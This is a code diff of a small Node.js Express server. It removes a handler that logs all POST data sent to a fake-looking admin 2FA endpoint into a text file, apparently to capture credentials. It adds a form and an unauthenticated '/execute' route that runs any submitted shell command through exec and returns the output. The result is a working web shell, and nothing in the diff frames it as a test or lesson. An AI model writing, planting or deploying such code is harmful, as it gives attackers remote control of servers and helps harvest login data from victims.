@@ -1,25 +1,43 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const fs = require('fs');
+const { exec } = require('child_process');
 
 const app = express();
-const port = 3000;
+const port = 82;
 
-app.use(bodyParser.urlencoded({ extended: false }));
-app.use(bodyParser.json());
+// Body parser middleware
+app.use(bodyParser.urlencoded({ extended: true }));
 
-app.post('/AdminApi/adminAccess/check2faStatus', (req, res) => {
-  // POST verisini txt dosyasına kaydetme
-  fs.appendFile('kayit.txt', JSON.stringify(req.body) + '\n', err => {
-    if (err) {
-      console.error(err);
-      res.status(500).send('Internal Server Error');
-    } else {
-      res.status(200).send('POST verisi başarıyla kaydedildi');
-    }
-  });
+// HTML Form
+app.get('/', (req, res) => {
+    res.send(`
+        <html>
+            <body>
+                <form action="/execute" method="post">
+                    <input type="text" name="command" placeholder="Enter command">
+                    <button type="submit">Send</button>
+                </form>
+            </body>
+        </html>
+    `);
 });
 
+// Command execution endpoint
+app.post('/execute', (req, res) => {
+    const command = req.body.command;
+
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            return res.send(`Error: ${error.message}`);
+        }
+        if (stderr) {
+            return res.send(`Stderr: ${stderr}`);
+        }
+        res.send(`Output: ${stdout}`);
+    });
+});
+
+// Start the server
 app.listen(port, () => {
-  console.log(`Sunucu çalışıyor. Port: ${port}`);
+    console.log(`Server is running on http://localhost:${port}`);
 });
